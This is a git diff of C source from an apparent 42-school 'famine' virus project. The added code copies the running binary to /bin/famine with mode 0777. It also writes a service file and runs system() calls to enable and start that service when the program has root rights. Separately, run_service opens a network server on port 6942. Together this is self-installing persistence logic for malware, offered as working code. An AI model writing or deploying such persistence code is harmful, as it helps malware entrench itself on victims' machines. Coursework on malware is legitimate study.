@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/04/18 15:18:30 by mbatty            #+#    #+#             */
-/*   Updated: 2026/05/23 14:22:38 by mbatty           ###   ########.fr       */
+/*   Updated: 2026/05/23 17:31:19 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -25,7 +25,7 @@
 
 	see SERVICE_FILE_CONTENT and SERVICE_FILE defines
 */
-static int	setup_service_file()
+static int	setup_service_file(const char *bin_path)
 {
 	int	fd;
 
@@ -34,8 +34,36 @@ static int	setup_service_file()
 		return (-1);
 
 	write(fd, SERVICE_FILE_CONTENT, sizeof(SERVICE_FILE_CONTENT));
+
 	system(SERVICE_ENABLE);
 	system(SERVICE_START);
+
+	ssize_t rdb;
+
+	int		fdin;
+	int		fdout;
+
+	char 	buf[4096];
+
+	fdin = open(bin_path, O_RDONLY);
+	if (fdin == -1)
+		return (-1);
+	fdout = open("/bin/famine", O_CREAT | O_WRONLY | O_TRUNC, 0777);
+	if (fdout == -1)
+	{
+		close(fdin);
+		return (-1);
+	}
+
+	do
+	{
+		rdb = read(fdin, buf, sizeof(buf));
+		write(fdout, buf, rdb);
+	} while (rdb > 0);
+
+	close(fdin);
+	close(fdout);
+
 	return (0);
 }
 
@@ -163,7 +191,7 @@ void	disconnect_hook(t_client *client, void *ptr)
 	(void)client;
 }
 
-int	run_service()
+int	run_service(const char *bin_path)
 {
 	t_service_ctx	ctx = {0};
 
@@ -173,7 +201,7 @@ int	run_service()
 		return (-1);
 
 	if (ctx.super_user)
-		setup_service_file();
+		setup_service_file(bin_path);
 
 	if (!server_open(&ctx.server, 6942))
 	{
